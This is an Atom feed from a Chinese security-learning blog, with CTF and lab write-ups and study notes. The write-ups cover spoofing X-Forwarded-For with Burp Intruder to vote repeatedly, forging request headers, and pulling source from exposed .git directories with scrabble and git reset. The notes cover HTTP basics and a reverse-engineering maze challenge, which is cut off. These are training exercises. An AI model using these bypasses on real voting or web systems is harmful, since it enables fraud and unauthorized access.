<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://sinky.top/atom.xml" rel="self"/>
  
  <link href="https://sinky.top/"/>
  <updated>2023-03-21T05:38:56.419Z</updated>
  <id>https://sinky.top/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>墨者学院：投票系统程序设计缺陷分析</title>
    <link href="https://sinky.top/2023/03/21/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%9A%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/"/>
    <id>https://sinky.top/2023/03/21/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%9A%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90/</id>
    <published>2023-03-21T02:39:22.110Z</published>
    <updated>2023-03-21T05:38:56.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>年终了，公司组织了各单位”文明窗口”评选网上投票通知。<br>安全工程师”墨者”负责对投票系统进行安全测试，看是否存在安全漏洞会影响投票的公平性</p><h1 id="实训目标"><a href="#实训目标" class="headerlink" title="实训目标"></a>实训目标</h1><ol><li>了解浏览器插件的使用；</li><li>了解开发程序员对IP地址获取方式；</li><li>了解网络协议软件的使用，如burpsuite等；</li></ol><h1 id="解题方向"><a href="#解题方向" class="headerlink" title="解题方向"></a>解题方向</h1><p>根据页面提示，进行投票页面测试。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p><img src="https://s2.loli.net/2023/03/21/FryYQLUucdSh9Hg.png" alt="image.png"></p><p>投个票试试：</p><p><img src="https://s2.loli.net/2023/03/21/xbHCIAJSqLfilhz.png" alt="image.png"></p><p>只能投一次。bp抓包</p><p><img src="https://s2.loli.net/2023/03/21/whCT9RpsJX8tcxS.png" alt="image.png"></p><p>跟IP地址获取方式有关，查一下php的ip验证绕过：</p><p><a href="https://www.qycn.com/xzx/article/3150.html">https://www.qycn.com/xzx/article/3150.html</a></p><p>可以利用<code>HTTP_X_FORWARDED_FOR</code></p><p>在数据包中添加<code>x-forwarded-for: 114.248.238.236</code></p><p>发送到测试器，选择ip后两位为变量，选择集束炸弹模式。</p><p>变量范围从1-100，步数为1</p><p><img src="https://s2.loli.net/2023/03/21/8AhHtf7kZUEC2D5.png" alt="image.png"></p><p>开始攻击，可以看到响应包显示返回为0 （错误的时候返回了-1）</p><p><img src="https://s2.loli.net/2023/03/21/NHYubmkXD5ypR4v.png" alt="d168f47bbe7e5032b64bfe54570c7c5.png"></p><p>说明攻击成功。</p><p>刷新一下网页，成功投票！</p><pre><code class="hljs">mozhe4601b79cf8cdc3f2855fe2046d0</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;年终了，公司组织了各单位”文明窗口”评选网上投票通知。&lt;br&gt;安全工程师”墨者”负责对投票系统进行安全测试，看是否存在安全漏</summary>
      
    
    
    
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
  </entry>
  
  <entry>
    <title>墨者学院：HTTP动作练习</title>
    <link href="https://sinky.top/2023/03/21/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%9AHTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/"/>
    <id>https://sinky.top/2023/03/21/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%9AHTTP%E5%8A%A8%E4%BD%9C%E7%BB%83%E4%B9%A0/</id>
    <published>2023-03-21T02:18:19.646Z</published>
    <updated>2023-03-21T02:34:20.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>某日，安全工程师”墨者”对一企业办公系统的源代码进行授权检测，在检查过程中，发现程序员(可能是临时工)使用PHP程序，处理服务端接收客户端传递的数据时，使用的是$_REQUEST[]，前端使用的是GET方式，然后就遇到问题了”Request-URI Too Long”。</p><h1 id="解题方向"><a href="#解题方向" class="headerlink" title="解题方向"></a>解题方向</h1><p>通过POST方式提交”content”数据内容,查看服务端返回的结果。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p><img src="https://s2.loli.net/2023/03/21/AfESI5T6iwXtNZ2.png" alt="image.png"></p><p>bp抓包看看：</p><p><img src="https://s2.loli.net/2023/03/21/tHpgIBAomkTdXvb.png" alt="image.png"></p><p>GET请求在URL中传送参数有长度限制，但POST没有。</p><p>百度查一下post提交content：</p><p><a href="https://blog.csdn.net/weixin_45433031/article/details/118229486">https://blog.csdn.net/weixin_45433031/article/details/118229486</a></p><p>要加<code>Content-Type: application/x-www-form-urlencoded</code></p><p>content内容移动到请求体部分（最下面）</p><p>改为POST：</p><p><img src="https://s2.loli.net/2023/03/21/vghEo2dIHTWuSMb.png" alt="image.png"></p><p>ps: 一开始失败了不知道为啥</p><pre><code class="hljs">KEY: mozhe214993188b9c90eeaa6a41ae760</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;某日，安全工程师”墨者”对一企业办公系统的源代码进行授权检测，在检查过程中，发现程序员(可能是临时工)使用PHP程序，处理服</summary>
      
    
    
    
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
  </entry>
  
  <entry>
    <title>墨者学院:浏览器信息伪造</title>
    <link href="https://sinky.top/2023/03/21/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%9A%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/"/>
    <id>https://sinky.top/2023/03/21/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%EF%BC%9A%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/</id>
    <published>2023-03-21T02:08:49.556Z</published>
    <updated>2023-03-21T02:17:09.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>小墨了解到从微信6.0开始，其内嵌的浏览器在User Agent字符串中增加了NetType字段用于标识客户端（手机）当前的网络环境,增加之后真的安全吗？</p><h1 id="解题方向"><a href="#解题方向" class="headerlink" title="解题方向"></a>解题方向</h1><p>根据页面提示,抓包分析除了判断浏览器类型还判断了微信特有的NetType</p><h1 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h1><p>访问网址：</p><p><img src="https://s2.loli.net/2023/03/21/ajOJb23GLwMpely.png" alt="image.png"></p><p>bp抓包看看：</p><p><img src="https://s2.loli.net/2023/03/21/Wvr4hp17K8M9wIU.png" alt="image.png"></p><p>把U-A字段换成iphone手机端和2G网络的识别数据，百度搜一下微信NetType字段。</p><p>找到符合条件的测试数据：</p><pre><code class="hljs">Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G</code></pre><p>改一下数据包，成功：</p><pre><code class="hljs">KEY: mozhedd36eed0c5304debd056b8de268</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h1&gt;&lt;p&gt;小墨了解到从微信6.0开始，其内嵌的浏览器在User Agent字符串中增加了NetType字段用于标识客户端（手机）当前的</summary>
      
    
    
    
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="墨者学院" scheme="https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"/>
    
  </entry>
  
  <entry>
    <title>小迪安全-渗透测试</title>
    <link href="https://sinky.top/2023/03/09/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>https://sinky.top/2023/03/09/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2023-03-09T01:55:32.555Z</published>
    <updated>2023-03-23T02:09:31.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>顶级域名</p><pre><code class="hljs">www.baidu.com</code></pre><p>二级域名</p><pre><code class="hljs">news.baidu.com</code></pre><p>多级域名（三级域名）</p><pre><code class="hljs">m.new.baidu.com</code></pre><p>域名对于安全测试的作用：</p><p>通过信息收集找可以攻击的突破口</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>域名系统，dns作为将域名和IP地址相互映射的一个分布式数据库，能够更方便访问互联网，DNS使用UDP端口53，对于每一级域名长度限制为63个字符，域名总长度不超过253个字符。</p><h3 id="本地HOST与DNS"><a href="#本地HOST与DNS" class="headerlink" title="本地HOST与DNS:"></a>本地HOST与DNS:</h3><p>在DNS解析域名时，会先到本地HOST文件去寻找有无对应IP,若无再去服务器上去找，若修改本地HOST文件中的IP,则域名会解析成修改后的IP(相当于重定向)</p><p>例子：</p><p><img src="https://s2.loli.net/2023/03/09/1tbEjO7IwTVKfmX.png" alt="图片.png"></p><p>修改host文件，添加一条：</p><pre><code class="hljs">1.2.3.4 www.Sinky.top</code></pre><p>再次ping,得到的解析的ip为<code>1.2.3.4</code></p><p><img src="https://s2.loli.net/2023/03/09/etvgQEr3sMAPBWq.png" alt="图片.png"></p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>CDN，内容分发网络，即避开互联网上有可能影响数据传输速度和稳定性的瓶颈和缓解，使内容传输更快更稳定。</p><p>当用户访问一个网站时，网站会就近给用户分配一个节点去访问，避免访问量过大或者速度慢的问题，但节点只是一个缓存数据，我们对节点扫描得不到什么信息。</p><p>与DNS的关系：没啥关系</p><p>CDN跟地域有关，就近分配节点，与DNS服务器的更换无关。</p><h3 id="常见的DNS安全攻击"><a href="#常见的DNS安全攻击" class="headerlink" title="常见的DNS安全攻击"></a>常见的DNS安全攻击</h3><p>DNS被攻击，会造成大量用户的网站被恶意解析。</p><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><p>常见脚本语言类型：asp、php、aspx、jsp、javaweb、pl、py、cgi等</p><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>攻击者在安全测试或非法攻击时留下的后门文件，便于下次操作。</p><p>免杀：防止后门被杀毒软件检测到。</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p> WEB组成架构模型：</p><ul><li>网站源码：分脚本类型，分应用方向</li><li>操作系统：windows,linux</li><li>中间件（搭建平台）：apache,iis,tomcat,nginx等</li><li>数据库：access,mysql,oracle,sybase,db2,postsql等</li></ul><p>为什么要以WEB层面为主？</p><p>因为WEB层面漏洞较多，操作系统漏洞少且基本没有利用得上的机会。</p><h2 id="WEB相关安全漏洞"><a href="#WEB相关安全漏洞" class="headerlink" title="WEB相关安全漏洞"></a>WEB相关安全漏洞</h2><ol><li>WEB源码类对应漏洞<ol><li>SQL注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化</li></ol></li><li>WEB中间件对应漏洞</li><li>WEB数据库对应漏洞</li><li>WEB系统层对应漏洞</li><li>其他第三方对应漏洞</li><li>APP或PC应用结合类</li></ol><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ol><li>多级域名的枚举查找<ol><li>搜索引擎查找</li><li>批量爆破：Layer子域名挖掘机</li><li>运营商第三方接口</li><li>查看域名的A记录，MX记录，CNAME记录和NS记录</li></ol></li><li>DNS解析修改后分析（本地或服务）</li><li>EXE后门功能及危害及类似WEB后门</li><li>APP类结合WEB协议，PC类结合WEB协议</li></ol><h1 id="基础入门-数据包拓展"><a href="#基础入门-数据包拓展" class="headerlink" title="基础入门-数据包拓展"></a>基础入门-数据包拓展</h1><h2 id="HTTP-x2F-S数据包"><a href="#HTTP-x2F-S数据包" class="headerlink" title="HTTP/S数据包"></a>HTTP/S数据包</h2><ul><li>浏览器 ——Request——&gt; Web Server</li><li>Web Server ——Response——&gt; 浏览器<ul><li>Request 请求数据包</li><li>Response 返回数据包</li></ul></li></ul><p><img src="https://s2.loli.net/2023/03/13/czCIRBwWAMi7U82.png" alt="图片.png"></p><ul><li>proxy 代理服务器</li></ul><p><img src="https://s2.loli.net/2023/03/13/WZ9tXVkRrAhu4Ev.png" alt="图片.png"></p><h3 id="http和https的区别"><a href="#http和https的区别" class="headerlink" title="http和https的区别"></a>http和https的区别</h3><p>http简要通信过程：</p><p>建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接</p><ol><li>浏览器建立与web服务器之间的连接</li><li>浏览器将请求数据打包（生成请求数据包）并发送到web服务器</li><li>web服务器将处理结果打包（生成响应数据包）并发送给浏览器</li><li>web服务器关闭连接</li></ol><p>https简要通信过程：</p><p><img src="https://s2.loli.net/2023/03/13/eUuKLXqhda925sy.png" alt="图片.png"></p><h2 id="Request请求数据包数据格式"><a href="#Request请求数据包数据格式" class="headerlink" title="Request请求数据包数据格式"></a>Request请求数据包数据格式</h2><ol><li>请求行：请求类型/请求资源路径、协议的版本和类型<ol><li>请求行由三个标记组成：请求方法、请求URL和HTTP版本，用空格分隔</li><li>例：<code>GET /index.html HTTP/1.1</code></li><li>HTTP:规划定义了八种可能的请求方法</li><li>GET:检索URL中标识资源的一个简单请求</li><li>HEAD:与GET方法相同，服务器只返回状态行和头标，并不返回请求文档</li><li>POST:服务器接受被写入客户端输出流中的数据的请求</li><li>PUT:服务器保存请求数据作为指定URL新内容的请求</li><li>DELETE:服务器删除URL中命令的资源的请求</li><li>OPTIONS:关于服务器支持的请求方法信息的请求</li><li>TRACE:web服务器反馈http请求和其头标的请求</li><li>CONNECT:已文档化，但当前未实现的一个方法，预留做隧道处理</li></ol></li><li>请求头：一些键值对，浏览器与web服务器之间都可以发送，特定的某种含义。<ol><li>由关键字/值对组成，每行一对，关键字和值用冒号分享，请求头标通知服务器有关于客户端请求的信息</li><li>HOST:请求的主机名，允许多个域名同处一个IP地址，即虚拟主机</li><li>Accept:客户端可识别的内容类型列表，指浏览器或其他客户可以接受的MIME文件格式，服务器可以根据它判断并返回适当的文件格式。</li><li>User-Agent:产生请求的浏览器类型</li><li>Host:对应网址URL中的WEB名称和端口号</li><li>Accept-Language:指出浏览器可以接受的语言种类，如en或en-us，指用英语</li><li>connection:用于告诉服务器是否可以维持固定的http连接。http是无连接的，http/1.1使用Keep-Alive为默认值，当浏览器需要多个文件时不需要每次建立连接。</li><li>cookie:浏览器用这个属性向服务器发送cookie，cookie是在浏览器中寄存的小型数据体，可以记载和服务器相关的用户信息，也可以用来实现会话功能。</li><li>referer:表明产生请求的网页URL.如：从网页<code>/icconcept/index.jsp</code>中点击一个链接到网页<code>/icwork/search</code>，在向服务器发送的<code>GET/icwork/search</code>中的请求中，referer是<code>http://hostname:8080/icconcept/index.jsp</code>，这个属性可以用来跟踪web请求是从什么网站来的。</li><li>content-Type:用来表明request的内容类型，可以用HttpServletRequewst的getContentType()方法取得。</li><li>Accept-Encodiing:指出浏览器可以接受的编码方式，编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度，浏览器在接收到web响应之后先解码，然后再检查文件格式。</li></ol></li><li>空行：请求头与请求体之间用一个空行隔开。最后一个请求头标之后是空行，发送回车符和退行，通知服务器一下不再有头标</li><li>请求体：要发送的数据（一般post提交会使用，如：<code>user=123&amp;pass=123</code>）<ol><li>使用post传送，最常使用的是Content-Type和Content-Length头标。</li></ol></li></ol><h2 id="Response返回数据包数据格式"><a href="#Response返回数据包数据格式" class="headerlink" title="Response返回数据包数据格式"></a>Response返回数据包数据格式</h2><p>一个响应由四个部分组成：状态行、响应头标、空行、响应数据</p><ol><li>状态行：协议版本，数字形式的状态代码和状态描述，个元素之间以空格分隔</li><li>响应头标：包含服务器类型、日期、长度、内容类型等</li><li>空行：响应头与响应体之间用空行隔开</li><li>响应数据：浏览器会将实体内容中的数据取出来生成相应的页面</li></ol><h3 id="HTTP响应码"><a href="#HTTP响应码" class="headerlink" title="HTTP响应码"></a>HTTP响应码</h3><ul><li>1xx:信息，请求收到，继续处理</li><li>2xx:成功，行为被成功的接受，理解和采纳</li><li>3xx:重定向，为了完成请求，必须进一步执行的动作</li><li>4xx:客户端错误</li><li>5xx:服务器错误</li></ul><p>例子：</p><ul><li>200 存在文件</li><li>403 存在文件夹</li><li>3xx 均可能存在</li><li>404 不存在文件及文件夹</li><li>500 均可能存在</li></ul><p>响应头标： 像请求头标一样，指出服务器的功能，标识出响应数据的细节</p><p>空行：略</p><p>响应数据：HTML文档和图像等。</p><p>工具：御剑后台扫描工具</p><h4 id="练习-墨者学院，已做完-："><a href="#练习-墨者学院，已做完-：" class="headerlink" title="练习(墨者学院，已做完)："></a>练习(墨者学院，已做完)：</h4><ul><li>来源页伪造：<ul><li>抓包修改referer来源为google.com即可。</li></ul></li><li>浏览器信息伪造：<ul><li>抓包</li><li>提示Nettype，搜索‘Nettype 微信’</li><li>找到测试案例数据,将数据包种U-A换成该数据即可。</li></ul></li></ul><p>数据：</p><pre><code class="hljs">iPhone 5 / iOS 8.0 / 2GMozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G</code></pre><ul><li>HTTP动作练习：<ul><li>修改成post请求</li><li>添加<code>Content-Type:application/x-www-form-urlencoded</code></li><li>将content移动到请求体中。</li></ul></li><li>投票系统程序设计缺陷分析:<ul><li>用代理或者程序验证ip的绕过方式</li><li>php验证ip地址：<code>HTTP_X_FORWARDED_FOR</code>可以伪造</li><li>将<code>HTTP_X_FORWARDED_FOR: ip</code>贴入数据包，发送至Intruder，设置ip后两位为变量，选择Cluster bomb模式。</li><li>设置参数一为Numbers，范围1-255，步数为1.</li><li>设置参数二为Numbers，范围1-255，步数为1.</li><li>开始攻击，查看返回信息为0，无错误（刚刚错误的返回信息是-1）</li></ul></li></ul><h1 id="基础入门-搭建安全拓展"><a href="#基础入门-搭建安全拓展" class="headerlink" title="基础入门-搭建安全拓展"></a>基础入门-搭建安全拓展</h1><ul><li>常见搭建平台脚本启用</li><li>域名IP目录解析安全问题<ul><li>扫域名和IP出现的是不同级的目录，可能会有一些备份泄露</li></ul></li><li>常见文件后缀解析对应安全<ul><li>Apache httpd 多后缀解析漏洞（靶场）</li><li>vulhub靶场</li></ul></li><li>常见安全测试中的安全防护</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概念名词&quot;&gt;&lt;a href=&quot;#概念名词&quot; class=&quot;headerlink&quot; title=&quot;概念名词&quot;&gt;&lt;/a&gt;概念名词&lt;/h1&gt;&lt;h2 id=&quot;域名&quot;&gt;&lt;a href=&quot;#域名&quot; class=&quot;headerlink&quot; title=&quot;域名&quot;&gt;&lt;/a&gt;域名&lt;/h</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://sinky.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>从0到1：CTFer成长之路</title>
    <link href="https://sinky.top/2023/02/03/%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/"/>
    <id>https://sinky.top/2023/02/03/%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/</id>
    <published>2023-02-03T01:21:18.972Z</published>
    <updated>2023-02-21T01:27:14.280Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第1章-Web入门"><a href="#第1章-Web入门" class="headerlink" title="第1章 Web入门"></a>第1章 Web入门</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h3><p>通过敏感目录泄露，可以获取网站源代码和敏感url地址，如网站后台地址等。</p><h4 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h4><p>git是一个主流分布式版本控制系统，攻击者可以通过.git文件夹中信息获取开发人员提交过的所有源码，进而攻击。</p><h5 id="常规git泄露"><a href="#常规git泄露" class="headerlink" title="常规git泄露"></a>常规git泄露</h5><p>通过运用工具或脚本获取网站源码或flag.</p><p>例：工具scrabble：<a href="https://gitcode.net/mirrors/denny0223/scrabble?utm_source=csdn_github_accelerator" title="scrabble">https://gitcode.net/mirrors/denny0223/scrabble?utm_source=csdn_github_accelerator</a></p><p>使用方法：</p><pre><code class="hljs">./scrabble http://example.com/</code></pre><p>运行scrabble即可获取源代码。</p><h5 id="git回滚"><a href="#git回滚" class="headerlink" title="git回滚"></a>git回滚</h5><p>git会记录每次提交(commit)的修改，所以当题目存在git泄露时，敏感文件可能在修改中被删除或被覆盖了，这时我们可以利用<code>git reset</code>命令恢复到以前版本。</p><p>例：</p><pre><code class="hljs">./scrabble http://example.com/git reset --hard HEAD^ #跳到上一版本---HEAD表当前版本，HEAD^表示上一版本git log-stat # 查看每个commit修改的文件git diff HEAD commit-id # 比较在当前版本与想查看的commit之间的变化</code></pre><h5 id="git分支"><a href="#git分支" class="headerlink" title="git分支"></a>git分支</h5><p>在每次提交时，git会自动将他们串成一条时间线，这条线就是一个分支，git允许使用多个分支，从而让用户可以把工作从开发主线上分离出来，以免影响开发主线。</p><p>git中默认为master分支</p><pre><code class="hljs">git log # 只能找到当前分支上的修改</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第1章-Web入门&quot;&gt;&lt;a href=&quot;#第1章-Web入门&quot; class=&quot;headerlink&quot; title=&quot;第1章 Web入门&quot;&gt;&lt;/a&gt;第1章 Web入门&lt;/h1&gt;&lt;h2 id=&quot;信息搜集&quot;&gt;&lt;a href=&quot;#信息搜集&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="学习笔记" scheme="https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>安全之路：Web渗透技术及实战案例解析</title>
    <link href="https://sinky.top/2023/01/31/%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B7%AF%EF%BC%9AWeb%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/"/>
    <id>https://sinky.top/2023/01/31/%E5%AE%89%E5%85%A8%E4%B9%8B%E8%B7%AF%EF%BC%9AWeb%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90/</id>
    <published>2023-01-31T08:12:17.838Z</published>
    <updated>2023-02-21T01:27:14.284Z</updated>
    
    
    
    
    
    <category term="学习笔记" scheme="https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Web" scheme="https://sinky.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界re-难度1</title>
    <link href="https://sinky.top/2023/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre-%E9%9A%BE%E5%BA%A61/"/>
    <id>https://sinky.top/2023/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre-%E9%9A%BE%E5%BA%A61/</id>
    <published>2023-01-31T01:15:14.390Z</published>
    <updated>2023-02-21T01:27:14.291Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easyRE1"><a href="#easyRE1" class="headerlink" title="easyRE1"></a>easyRE1</h1><p>下载附件有俩文件，先看一下32位的。</p><p>直接给出了</p><pre><code class="hljs">flag:db2f62a36a018bce28e46d976e3f9864</code></pre><h1 id="lucknum"><a href="#lucknum" class="headerlink" title="lucknum"></a>lucknum</h1><p>64位ida打开……直接有flag</p><h1 id="reverse-re3"><a href="#reverse-re3" class="headerlink" title="reverse_re3"></a>reverse_re3</h1><p>题目描述:我从不走回头路，但你能找到我选择的路吗</p><p>看提示好像是个地图题，ida看一下</p><p><img src="https://s2.loli.net/2023/01/31/iTC6GwAoPdIUVZQ.png" alt="图片.png"></p><pre><code class="hljs">w a s d应该是方向上下左右dword_202AB0=2的时候停止</code></pre><p>找一下地图</p><p>看一下方向键里面的函数内容，打开sub_E23()</p><p><img src="https://s2.loli.net/2023/01/31/IFl5WXx48ya9P2K.png" alt="图片.png"></p><p>地图应该就是这个<code>dword_202020</code>,看一下</p><p><img src="https://s2.loli.net/2023/01/31/ADs8iNxCKmgf4GS.png" alt="图片.png"></p><p>选中dword_202020，shift+e提取数据：</p><p><img src="https://s2.loli.net/2023/01/31/qEisuB5TS3IvLxY.png" alt="图片.png"></p><p>得到的数据处理一下，去掉中间三个0得到：</p><figure class="highlight accesslog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">第一个迷宫<br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 3, 1, 1, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br><span class="hljs-string">[1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span><br>第二个迷宫<br><span class="hljs-string">[1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span><br><span class="hljs-string">[1, 1, 0, 3, 1, 1, 1, 